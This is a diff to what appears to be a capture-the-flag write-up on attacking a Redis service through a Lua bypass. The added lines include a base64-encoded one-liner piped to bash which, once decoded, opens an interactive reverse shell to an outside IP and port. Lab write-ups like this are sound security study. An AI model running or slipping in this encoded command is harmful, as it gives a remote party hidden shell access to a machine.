@@ -349,7 +349,9 @@ Now all we have to is put in the command to cat the flag!
 127.0.0.1:6379> 
 ```
 
-I thought it was pretty interesting that hacktricks stated that a reverse shell could not be done with the lua bypass method, however with a bit of searching I found that the following script actually can pop a temporary reverse shell until root kills the process.
+Originally I was trying to pop my reverse shell in /tmp but I found out that the /tmp was different for root than the user and therefore could not read my file
+
+The method below works as well as just base64 encoding your payload. ```echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44My8xMjM0IDA+JjE= | base64 -d | bash```
 
 This reverse shell method is from a certain spanish cat ;)
 
